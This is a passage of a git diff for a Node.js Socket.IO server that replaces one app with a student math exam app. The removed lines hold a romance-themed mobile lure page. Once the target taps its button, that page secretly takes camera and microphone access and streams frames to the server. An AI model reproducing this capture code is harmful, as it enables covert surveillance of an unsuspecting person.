@@ -1,602 +1,1824 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
+const { v4: uuidv4 } = require('uuid');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { 
-  cors: { origin: "*" },
-  pingTimeout: 60000,
-  pingInterval: 25000
+const io = new Server(server, {
+  cors: { origin: "*" }
 });
 
 const PORT = process.env.PORT || 3000;
 
+// ========== ARMAZENAMENTO PERSISTENTE ==========
+const DATA_FILE = './data.json';
+
+let students = new Map();
+let answers = new Map();
+let sessions = new Map();
+
+function loadData() {
+  try {
+    if (fs.existsSync(DATA_FILE)) {
+      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+      students = new Map(Object.entries(data.students || {}));
+      answers = new Map(Object.entries(data.answers || {}));
+      sessions = new Map(Object.entries(data.sessions || {}));
+      console.log('📂 Dados carregados com sucesso!');
+    }
+  } catch (e) {
+    console.log('⚠️ Nenhum dado salvo encontrado');
+  }
+}
+
+function saveData() {
+  try {
+    const data = {
+      students: Object.fromEntries(students),
+      answers: Object.fromEntries(answers),
+      sessions: Object.fromEntries(sessions)
+    };
+    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+    console.log('💾 Dados salvos com sucesso!');
+  } catch (e) {
+    console.log('❌ Erro ao salvar dados:', e);
+  }
+}
+
+loadData();
+setInterval(saveData, 30000);
+
+// ============================================================
+// >>>>>>>>>> CADASTRE AS DUPLAS AQUI >>>>>>>>>>>>>>>>>>>>>>>>>
+// ============================================================
+const DUPLAS = [
+  {
+    id: 'dupla1',
+    nome: 'Dupla 1',
+    alunos: ['SILVERIO SANTOS MARTINS', 'LUCAS SANTOS MARTINS']
+  },
+  {
+    id: 'dupla2',
+    nome: 'Dupla 2',
+    alunos: ['MARIA JOSE SILVA', 'JOAO PEDRO SOUZA']
+  },
+  {
+    id: 'dupla3',
+    nome: 'Dupla 3',
+    alunos: ['ANA BEATRIZ COSTA', 'CARLOS EDUARDO LIMA']
+  },
+  {
+    id: 'dupla4',
+    nome: 'Dupla 4',
+    alunos: ['FERNANDA OLIVEIRA', 'ROBERTO ALMEIDA']
+  }
+];
+// ============================================================
+
+// ========== QUESTÕES ==========
+const questions = [
+  {
+    id: 1,
+    question: "Calcule o valor de 25 + 37",
+    correctAnswer: "62"
+  },
+  {
+    id: 2,
+    question: "Quanto é 15 × 8?",
+    correctAnswer: "120"
+  },
+  {
+    id: 3,
+    question: "Qual é a raiz quadrada de 144?",
+    correctAnswer: "12"
+  },
+  {
+    id: 4,
+    question: "Calcule 3² + 4²",
+    correctAnswer: "25"
+  },
+  {
+    id: 5,
+    question: "Quanto é 2⁵?",
+    correctAnswer: "32"
+  },
+  {
+    id: 6,
+    question: "Qual é o valor de π (pi) com duas casas decimais?",
+    correctAnswer: "3.14"
+  },
+  {
+    id: 7,
+    question: "Calcule 45 ÷ 9",
+    correctAnswer: "5"
+  },
+  {
+    id: 8,
+    question: "Quanto é 100 - 37?",
+    correctAnswer: "63"
+  },
+  {
+    id: 9,
+    question: "Qual é o dobro de 128?",
+    correctAnswer: "256"
+  },
+  {
+    id: 10,
+    question: "Calcule 7 × 7 - 10",
+    correctAnswer: "39"
+  }
+];
+
+// ========== FUNÇÕES AUXILIARES ==========
+function normalizeText(text) {
+  return text.trim().toUpperCase();
+}
+
+function getDuplaByAluno(nome) {
+  const nomeNormalizado = normalizeText(nome);
+  for (const dupla of DUPLAS) {
+    for (const aluno of dupla.alunos) {
+      if (normalizeText(aluno) === nomeNormalizado) {
+        return dupla;
+      }
+    }
+  }
+  return null;
+}
+
+// ========== ROTAS ==========
+
 app.get('/', (req, res) => {
-  const ua = req.headers['user-agent']?.toLowerCase() || '';
-  const isMobile = /mobile|android|iphone/i.test(ua);
-  const host = req.headers.host;
-  const protocol = req.headers['x-forwarded-proto'] || 'http';
-  const fullUrl = `${protocol}://${host}`;
+  const ua = req.headers['user-agent'].toLowerCase();
+  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
 
-  res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
-});
-
-// ==================== CELULAR - VERSÃO ROMÂNTICA ====================
-function getMobileHTML(fullUrl) {
-  return `<!DOCTYPE html>
-<html lang="pt-BR">
+  if (isMobile) {
+    // ========== PÁGINA DO CELULAR (ALUNO) ==========
+    res.send(`<!DOCTYPE html>
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-    <title>Loirinha mais linda do Mundo!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Prova Matemática</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #ffe4f3, #ffb6e6);
-            height: 100vh;
-            overflow: hidden;
-            position: relative;
-            color: #4a2c4a;
-        }
-
-        /* Corações flutuando no fundo */
-        .hearts {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            pointer-events: none;
-            overflow: hidden;
-            z-index: 1;
-        }
-        .heart {
-            position: absolute;
-            font-size: 20px;
-            color: #ff4da6;
-            opacity: 0.7;
-            animation: floatHeart linear infinite;
-            text-shadow: 0 0 8px #ff80bf;
-        }
-        @keyframes floatHeart {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 0.8; }
-            100% { transform: translateY(-100px) rotate(25deg); opacity: 0; }
-        }
-
-        .header {
-            background: linear-gradient(to right, #ff69b4, #ff1493);
-            color: white;
-            padding: 14px 16px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a0a1a 0%, #2d1a2d 50%, #1a0a1a 100%);
+            color: #d4a0d4;
+            min-height: 100vh;
             display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 4px 15px rgba(255, 105, 180, 0.4);
-            position: relative;
-            z-index: 10;
-        }
-        .header h2 { 
-            flex: 1; 
-            font-size: 19px; 
-            font-weight: 700;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
-        }
-        .status-dot { 
-            width: 12px; 
-            height: 12px; 
-            background: #39ff14; 
-            border-radius: 50%; 
-            box-shadow: 0 0 10px #39ff14;
-        }
-
-        .messages {
-            height: calc(100vh - 118px);
-            overflow-y: auto;
-            padding: 20px 16px 80px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            position: relative;
-            z-index: 2;
-        }
-        .message {
-            display: flex;
-            margin-bottom: 10px;
-            animation: fadeIn 0.4s ease;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .message.received { justify-content: flex-start; }
-        .message.sent { justify-content: flex-end; }
-        .bubble {
-            max-width: 78%;
-            padding: 12px 16px;
-            border-radius: 20px;
-            font-size: 15.8px;
-            line-height: 1.45;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-        }
-        .message.received .bubble { 
-            background: white; 
-            color: #4a2c4a; 
-            border-top-left-radius: 6px; 
-        }
-        .message.sent .bubble { 
-            background: linear-gradient(to right, #ff69b4, #ff1493); 
-            color: white; 
-            border-top-right-radius: 6px; 
-        }
-        .time { 
-            font-size: 10.5px; 
-            opacity: 0.75; 
-            margin-top: 5px; 
-            text-align: right; 
-        }
-
-        .typing {
-            display: none;
-            padding: 12px 18px;
-            background: white;
-            border-radius: 20px;
-            width: fit-content;
-            color: #ff4da6;
-            font-size: 14px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-        }
-        .typing.show { display: block; }
-
-        .input-area {
-            position: fixed;
-            bottom: 0; left: 0; right: 0;
-            background: rgba(255, 255, 255, 0.95);
-            padding: 10px 12px 14px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border-top: 1px solid #ffb6e6;
-            z-index: 100;
-            backdrop-filter: blur(10px);
-        }
-        .input-field {
-            flex: 1;
-            background: #fff0f8;
-            border: 2px solid #ff99cc;
-            border-radius: 30px;
-            padding: 14px 18px;
-            color: #4a2c4a;
-            font-size: 16px;
-            outline: none;
-            min-height: 48px;
-        }
-        .send-btn {
-            background: linear-gradient(to right, #ff69b4, #ff1493);
-            color: white;
-            border: none;
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            font-size: 24px;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 105, 180, 0.5);
-        }
-
-        .modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.85);
-            display: flex;
             align-items: center;
-            justify-content: center;
-            z-index: 1000;
+            padding: 10px;
         }
-        .modal-content {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 30px;
-            text-align: center;
-            max-width: 320px;
-            box-shadow: 0 10px 40px rgba(255, 105, 180, 0.4);
-        }
-        .modal-content h3 {
-            color: #ff1493;
-            font-size: 24px;
-            margin-bottom: 12px;
-        }
-        .start-btn {
-            background: linear-gradient(to right, #ff69b4, #ff1493);
-            color: white;
-            border: none;
-            padding: 16px 30px;
-            border-radius: 50px;
-            font-size: 17px;
-            font-weight: bold;
+        .container {
+            max-width: 500px;
             width: 100%;
-            margin-top: 20px;
-            box-shadow: 0 6px 20px rgba(255, 105, 180, 0.5);
+            background: rgba(26, 10, 26, 0.95);
+            border: 2px solid #c084c0;
+            border-radius: 20px;
+            padding: 30px 25px;
+            min-height: 90vh;
+            box-shadow: 0 0 60px rgba(192, 132, 192, 0.1);
+            animation: fadeIn 0.6s ease-out;
         }
-        .conn-indicator {
-            position: fixed;
-            bottom: 75px;
-            right: 20px;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: #39ff14;
-            box-shadow: 0 0 12px #39ff14;
-            z-index: 200;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(192, 132, 192, 0.1); }
+            50% { box-shadow: 0 0 40px rgba(192, 132, 192, 0.2); }
+        }
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 2px solid rgba(192, 132, 192, 0.3);
+            margin-bottom: 25px;
+        }
+        .header h1 {
+            font-weight: 300;
+            letter-spacing: 3px;
+            font-size: 24px;
+            color: #e8c8e8;
+        }
+        .header .sub {
+            font-size: 13px;
+            opacity: 0.5;
+            margin-top: 5px;
+            letter-spacing: 2px;
+            color: #b888b8;
+        }
+        .header .decor {
+            width: 60px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #c084c0, transparent);
+            margin: 10px auto 0;
+        }
+        .login-area { padding: 10px 0; }
+        .login-area h2 {
+            text-align: center;
+            font-weight: 300;
+            letter-spacing: 2px;
+            opacity: 0.6;
+            margin-bottom: 25px;
+            font-size: 16px;
+            color: #d4a0d4;
+        }
+        .form-group { margin-bottom: 18px; }
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            letter-spacing: 1.5px;
+            opacity: 0.5;
+            margin-bottom: 6px;
+            color: #c084c0;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(18, 10, 18, 0.8);
+            border: 1px solid rgba(192, 132, 192, 0.3);
+            border-radius: 12px;
+            color: #e8c8e8;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.4s;
+        }
+        .form-group input:focus {
+            border-color: #c084c0;
+            box-shadow: 0 0 30px rgba(192, 132, 192, 0.1);
+        }
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #c084c0, #a060a0);
+            color: #1a0a1a;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.4s;
+            margin-top: 10px;
+        }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 40px rgba(192, 132, 192, 0.3); }
+        .login-btn:disabled { background: #3a2a3a; color: #5a4a5a; cursor: not-allowed; }
+        .error-msg { color: #ff6666; text-align: center; margin-top: 12px; font-size: 13px; }
+        .exam-area { display: none; }
+        .question-container {
+            background: rgba(18, 10, 18, 0.8);
+            border: 1px solid rgba(192, 132, 192, 0.3);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 15px;
+        }
+        .question-number {
+            font-size: 12px;
+            opacity: 0.4;
+            letter-spacing: 2px;
+            margin-bottom: 12px;
+            color: #b888b8;
+        }
+        .question-text {
+            font-size: 19px;
+            margin-bottom: 22px;
+            color: #e8c8e8;
+            line-height: 1.6;
+            font-weight: 300;
+        }
+        .answer-input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(18, 10, 18, 0.8);
+            border: 1px solid rgba(192, 132, 192, 0.3);
+            border-radius: 12px;
+            color: #e8c8e8;
+            font-size: 18px;
+            outline: none;
+            transition: all 0.4s;
+            text-align: center;
+        }
+        .answer-input:focus {
+            border-color: #c084c0;
+            box-shadow: 0 0 30px rgba(192, 132, 192, 0.1);
+        }
+        .answer-input:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .answer-status {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        .answer-status.correct {
+            color: #66cc88;
+            border: 2px solid #66cc88;
+            background: rgba(102, 204, 136, 0.1);
+        }
+        .answer-status.wrong {
+            color: #cc6666;
+            border: 2px solid #cc6666;
+            background: rgba(204, 102, 102, 0.1);
+        }
+        .answer-status.waiting {
+            color: #ff8844;
+            border: 2px solid #ff8844;
+            background: rgba(255, 136, 68, 0.1);
+        }
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(192, 132, 192, 0.2);
+            margin-bottom: 18px;
+            font-size: 12px;
+            opacity: 0.5;
+            color: #b888b8;
+        }
+        .status-bar .timer { font-weight: 600; color: #d4a0d4; }
+        .progress {
+            text-align: center;
+            padding: 12px;
+            font-size: 13px;
+            opacity: 0.4;
+            letter-spacing: 2px;
+            color: #b888b8;
+        }
+        .nav-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #c084c0, #a060a0);
+            color: #1a0a1a;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.4s;
+            margin-top: 10px;
+        }
+        .nav-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 40px rgba(192, 132, 192, 0.3); }
+        .nav-btn:disabled { background: #3a2a3a; color: #5a4a5a; cursor: not-allowed; }
+        .finish-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #cc6666, #aa4444);
+            color: #1a0a1a;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.4s;
+            margin-top: 15px;
+            display: none;
+        }
+        .finish-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 40px rgba(204, 102, 102, 0.3); }
+        .completion-area {
+            display: none;
+            text-align: center;
+            padding: 30px 0;
+        }
+        .completion-area .icon { font-size: 56px; color: #c084c0; margin-bottom: 15px; }
+        .completion-area h2 { font-weight: 300; letter-spacing: 3px; color: #e8c8e8; margin-bottom: 10px; }
+        .completion-area .code {
+            font-size: 28px;
+            letter-spacing: 6px;
+            padding: 18px;
+            background: rgba(18, 10, 18, 0.8);
+            border: 2px solid #c084c0;
+            border-radius: 12px;
+            margin: 15px 0;
+            color: #d4a0d4;
+            animation: glow 2s infinite;
+        }
+        .completion-area .info { opacity: 0.4; font-size: 13px; letter-spacing: 1px; margin: 8px 0; color: #b888b8; }
+        .completion-area .score { font-size: 38px; color: #c084c0; margin: 15px 0; }
+        .warning {
+            color: #ff6666;
+            font-size: 12px;
+            text-align: center;
+            padding: 10px;
+            background: rgba(26, 10, 10, 0.8);
+            border: 1px solid #ff6666;
+            border-radius: 8px;
+            margin: 8px 0;
+            display: none;
+        }
+        .blocked-msg { text-align: center; padding: 40px 0; color: #ff6666; }
+        .blocked-msg h2 { font-weight: 300; letter-spacing: 2px; margin-bottom: 10px; }
+        .dupla-info { font-size: 13px; opacity: 0.3; letter-spacing: 1px; color: #b888b8; margin-top: 3px; }
+        .view-result-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6688cc, #4466aa);
+            color: #1a0a1a;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.4s;
+            margin-top: 15px;
+        }
+        .view-result-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 40px rgba(102, 136, 204, 0.3); }
+        .result-area { display: none; }
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(192, 132, 192, 0.1);
+            font-size: 14px;
+        }
+        .result-item .correct { color: #66cc88; }
+        .result-item .wrong { color: #cc6666; }
+        .result-item .waiting { color: #ff8844; }
+        .result-item .time { opacity: 0.3; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div class="hearts" id="hearts"></div>
+    <div class="container">
+        <div class="header">
+            <h1>Prova Matemática</h1>
+            <div class="sub">Professor Heber Lemos</div>
+            <div class="decor"></div>
+        </div>
 
-    <div class="modal" id="permissionModal">
-        <div class="modal-content">
-            <h3>💖 Loirinha mais linda do Mundo!</h3>
-            <p>Quer conversar com seu futuro marido?</p>
-            <button class="start-btn" id="startBtn">Conversar com seu futuro marido!</button>
+        <div id="loginArea" class="login-area">
+            <h2>Identificação</h2>
+            <div class="form-group">
+                <label>Nome Completo</label>
+                <input type="text" id="studentName" placeholder="Digite seu nome completo">
+            </div>
+            <div class="form-group">
+                <label>Dupla</label>
+                <input type="text" id="studentDupla" placeholder="Ex: Dupla 1, Dupla 2">
+            </div>
+            <button class="login-btn" id="loginBtn">Iniciar Prova</button>
+            <div class="error-msg" id="loginError"></div>
+        </div>
+
+        <div id="examArea" class="exam-area">
+            <div class="status-bar">
+                <span class="timer" id="timer">00:00</span>
+                <span id="studentInfo">Aluno</span>
+            </div>
+            <div id="warning" class="warning"></div>
+            <div id="questionContainer"></div>
+            <div class="progress" id="progress">Questão 0 de 10</div>
+            <button class="nav-btn" id="nextBtn">Avançar</button>
+            <button class="finish-btn" id="finishBtn">Finalizar Prova</button>
+        </div>
+
+        <div id="completionArea" class="completion-area">
+            <div class="icon">✦</div>
+            <h2>Prova Finalizada</h2>
+            <div class="score" id="scoreDisplay">0/10</div>
+            <div class="info">Código de Finalização</div>
+            <div class="code" id="completionCode">XXXX-XXXX</div>
+            <div class="info" id="completionStats"></div>
+            <div class="dupla-info" id="completionDupla"></div>
+            <button class="view-result-btn" id="viewResultBtn">Ver Respostas</button>
+            <button class="login-btn" onclick="location.reload()" style="margin-top:10px;">Nova Prova</button>
+        </div>
+
+        <div id="resultArea" class="result-area">
+            <h2 style="text-align:center;font-weight:300;letter-spacing:2px;margin-bottom:15px;">Suas Respostas</h2>
+            <div id="resultList"></div>
+            <button class="login-btn" onclick="location.reload()" style="margin-top:15px;">Voltar</button>
+        </div>
+
+        <div id="blockedArea" class="blocked-msg" style="display:none;">
+            <h2>Acesso Bloqueado</h2>
+            <p>Esta prova já foi finalizada.</p>
+            <button class="login-btn" onclick="location.reload()" style="margin-top:20px;">Voltar</button>
         </div>
     </div>
 
-    <div class="header">
-        <div class="status-dot"></div>
-        <h2>Loirinha mais linda do Mundo! 💕</h2>
-    </div>
-
-    <div class="messages" id="messages">
-        <div class="typing" id="typing">Loirinha está digitando... 💕</div>
-    </div>
-
-    <div class="input-area">
-        <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem carinhosa...">
-        <button class="send-btn" id="sendBtn">💌</button>
-    </div>
-
-    <div class="conn-indicator" id="connIndicator"></div>
-    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>
-
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}', { reconnection: true });
+        const socket = io({ transports: ['websocket', 'polling'], reconnection: true });
+        let studentId = null;
+        let studentName = null;
+        let studentDupla = null;
+        let isLoggedIn = false;
+        let currentQuestion = 0;
+        let answers = {};
+        let startTime = null;
+        let timerInterval = null;
+        let elapsedSeconds = 0;
+        let isFinished = false;
+        let questionsData = ${JSON.stringify(questions)};
 
-        // Animação de corações
-        function createHeart() {
-            const heart = document.createElement('div');
-            heart.className = 'heart';
-            heart.textContent = ['💖', '❤️', '💗', '💓', '💘'][Math.floor(Math.random()*5)];
-            heart.style.left = Math.random() * 100 + 'vw';
-            heart.style.animationDuration = (Math.random() * 8 + 10) + 's';
-            heart.style.fontSize = (Math.random() * 18 + 18) + 'px';
-            document.getElementById('hearts').appendChild(heart);
+        const loginArea = document.getElementById('loginArea');
+        const examArea = document.getElementById('examArea');
+        const completionArea = document.getElementById('completionArea');
+        const resultArea = document.getElementById('resultArea');
+        const blockedArea = document.getElementById('blockedArea');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginError = document.getElementById('loginError');
+        const questionContainer = document.getElementById('questionContainer');
+        const progress = document.getElementById('progress');
+        const timer = document.getElementById('timer');
+        const studentInfo = document.getElementById('studentInfo');
+        const finishBtn = document.getElementById('finishBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const warning = document.getElementById('warning');
+        const completionCode = document.getElementById('completionCode');
+        const completionStats = document.getElementById('completionStats');
+        const scoreDisplay = document.getElementById('scoreDisplay');
+        const completionDupla = document.getElementById('completionDupla');
+        const resultList = document.getElementById('resultList');
+        const viewResultBtn = document.getElementById('viewResultBtn');
 
-            setTimeout(() => heart.remove(), 18000);
+        // ===== LOGIN =====
+        loginBtn.onclick = () => {
+            const name = document.getElementById('studentName').value.trim();
+            const dupla = document.getElementById('studentDupla').value.trim();
+            
+            if(!name || !dupla) {
+                loginError.textContent = 'Preencha todos os campos';
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Conectando...';
+            loginError.textContent = '';
+
+            studentName = name;
+            studentDupla = dupla;
+            socket.emit('student_login', { name, dupla });
+        };
+
+        socket.on('login_success', (data) => {
+            studentId = data.studentId;
+            isLoggedIn = true;
+            
+            if(data.alreadyFinished) {
+                loginArea.style.display = 'none';
+                completionArea.style.display = 'block';
+                completionCode.textContent = data.completionCode || 'XXXX-XXXX';
+                scoreDisplay.textContent = data.correctCount + '/10';
+                completionStats.textContent = 'Tempo total: ' + formatTime(data.totalTime || 0);
+                completionDupla.textContent = 'Dupla: ' + data.dupla;
+                viewResultBtn.style.display = 'block';
+                window.savedAnswers = data.allAnswers || {};
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Iniciar Prova';
+                return;
+            }
+
+            loginArea.style.display = 'none';
+            examArea.style.display = 'block';
+            studentInfo.textContent = data.name + ' | ' + data.dupla;
+            startTime = Date.now();
+            startTimer();
+            
+            // Carregar respostas salvas se houver
+            if(data.answers && Object.keys(data.answers).length > 0) {
+                answers = data.answers;
+            }
+            
+            renderQuestion(0);
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Iniciar Prova';
+        });
+
+        socket.on('login_error', (data) => {
+            loginError.textContent = data.error || 'Erro ao logar';
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Iniciar Prova';
+        });
+
+        socket.on('already_finished', () => {
+            loginArea.style.display = 'none';
+            completionArea.style.display = 'block';
+            viewResultBtn.style.display = 'block';
+        });
+
+        // ===== RECEBER CORREÇÃO DO PROFESSOR =====
+        socket.on('answer_corrected', (data) => {
+            if(data.studentId === studentId) {
+                // Atualiza a resposta local
+                if(answers[data.questionId]) {
+                    answers[data.questionId].isCorrect = data.isCorrect;
+                    answers[data.questionId].correctedBy = data.correctedBy;
+                    answers[data.questionId].correctedAt = data.correctedAt;
+                }
+                
+                // Se estiver na questão atual, atualiza a exibição
+                const q = questionsData[currentQuestion];
+                if(q && q.id === data.questionId) {
+                    updateAnswerStatus(data.isCorrect);
+                }
+                
+                // Atualiza o progresso
+                updateProgress();
+            }
+        });
+
+        // ===== RECEBER ATUALIZAÇÃO DE RESPOSTAS =====
+        socket.on('answers_updated', (data) => {
+            if(data.studentId === studentId) {
+                answers = data.answers;
+                // Se estiver na questão atual, atualiza a exibição
+                const q = questionsData[currentQuestion];
+                if(q && answers[q.id]) {
+                    updateAnswerStatus(answers[q.id].isCorrect);
+                }
+                updateProgress();
+            }
+        });
+
+        // ===== TIMER =====
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                elapsedSeconds++;
+                const minutes = Math.floor(elapsedSeconds / 60);
+                const seconds = elapsedSeconds % 60;
+                timer.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+            }, 1000);
         }
 
-        setInterval(createHeart, 450);
-        for(let i = 0; i < 8; i++) setTimeout(createHeart, i * 300);
+        // ===== RENDER QUESTION =====
+        function renderQuestion(index) {
+            if(index >= questionsData.length) {
+                finishBtn.style.display = 'block';
+                nextBtn.style.display = 'none';
+                progress.textContent = 'Prova Completa! Finalize';
+                return;
+            }
 
-        let mediaStream = null;
-        let facingMode = 'user';
-        let permissions = false;
-        let frameInterval = null;
-        let lastFrameTime = 0;
-        let typingTimeout = null;
+            const q = questionsData[index];
+            const savedAnswer = answers[q.id] ? answers[q.id].answer : '';
+            const isCorrect = answers[q.id] ? answers[q.id].isCorrect : null;
 
-        const messagesDiv = document.getElementById('messages');
-        const messageInput = document.getElementById('messageInput');
-        const sendBtn = document.getElementById('sendBtn');
-        const typingDiv = document.getElementById('typing');
-        const modal = document.getElementById('permissionModal');
-        const startBtn = document.getElementById('startBtn');
-        const connIndicator = document.getElementById('connIndicator');
-        const localVideo = document.getElementById('localVideo');
+            questionContainer.innerHTML = \`
+                <div class="question-container">
+                    <div class="question-number">Questão \${index + 1} de 10</div>
+                    <div class="question-text">\${q.question}</div>
+                    <input type="text" class="answer-input" id="answerInput" 
+                           placeholder="Digite sua resposta..." 
+                           value="\${savedAnswer}"
+                           \${savedAnswer ? 'disabled' : ''}>
+                    <div id="answerStatus" class="answer-status waiting">
+                        \${isCorrect === true ? '✓ Correta' : isCorrect === false ? '✗ Errada' : '⏳ Aguardando correção...'}
+                    </div>
+                </div>
+            \`;
 
-        function addMessage(text, isSent = true) {
-            const div = document.createElement('div');
-            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
-            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
-            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
-            messagesDiv.appendChild(div);
-            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
+            // Atualiza a cor do status
+            updateAnswerStatus(isCorrect);
+
+            // Evento de input para enviar resposta
+            const input = document.getElementById('answerInput');
+            if(input && !input.disabled) {
+                input.addEventListener('keypress', (e) => {
+                    if(e.key === 'Enter') {
+                        submitAnswer(q.id);
+                    }
+                });
+                
+                input.addEventListener('blur', () => {
+                    if(input.value.trim()) {
+                        submitAnswer(q.id);
+                    }
+                });
+            }
+
+            progress.textContent = 'Questão ' + (index + 1) + ' de 10';
+            finishBtn.style.display = 'none';
+            nextBtn.style.display = 'block';
+            nextBtn.disabled = !savedAnswer;
         }
 
-        function sendFrame() {
-            const now = Date.now();
-            if (!permissions || !localVideo.videoWidth || now - lastFrameTime < 220) return;
-            lastFrameTime = now;
+        // ===== SUBMIT ANSWER =====
+        function submitAnswer(questionId) {
+            const input = document.getElementById('answerInput');
+            if(!input || !input.value.trim()) return;
 
-            const canvas = document.createElement('canvas');
-            canvas.width = 240;
-            canvas.height = 180;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(localVideo, 0, 0, 240, 180);
-            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.65));
+            const answer = input.value.trim();
+            
+            // Salva a resposta
+            answers[questionId] = {
+                answer: answer,
+                isCorrect: null, // Aguardando correção do professor
+                timeSpent: Math.round(elapsedSeconds),
+                timestamp: new Date().toISOString()
+            };
+
+            // Desabilita o input
+            input.disabled = true;
+
+            // Atualiza status
+            updateAnswerStatus(null);
+
+            // Habilita próximo
+            nextBtn.disabled = false;
+
+            // Envia para o servidor
+            socket.emit('answer_submitted', {
+                studentId,
+                questionId,
+                answer,
+                timeSpent: Math.round(elapsedSeconds)
+            });
+
+            updateProgress();
         }
 
-        async function startPermissions() {
-            try {
-                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
-                if (frameInterval) clearInterval(frameInterval);
+        // ===== UPDATE ANSWER STATUS =====
+        function updateAnswerStatus(isCorrect) {
+            const statusDiv = document.getElementById('answerStatus');
+            if(!statusDiv) return;
 
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
-                    audio: true
+            if(isCorrect === true) {
+                statusDiv.textContent = '✓ Correta';
+                statusDiv.className = 'answer-status correct';
+            } else if(isCorrect === false) {
+                statusDiv.textContent = '✗ Errada';
+                statusDiv.className = 'answer-status wrong';
+            } else {
+                statusDiv.textContent = '⏳ Aguardando correção...';
+                statusDiv.className = 'answer-status waiting';
+            }
+        }
+
+        // ===== UPDATE PROGRESS =====
+        function updateProgress() {
+            const answered = Object.keys(answers).filter(qId => answers[qId].answer).length;
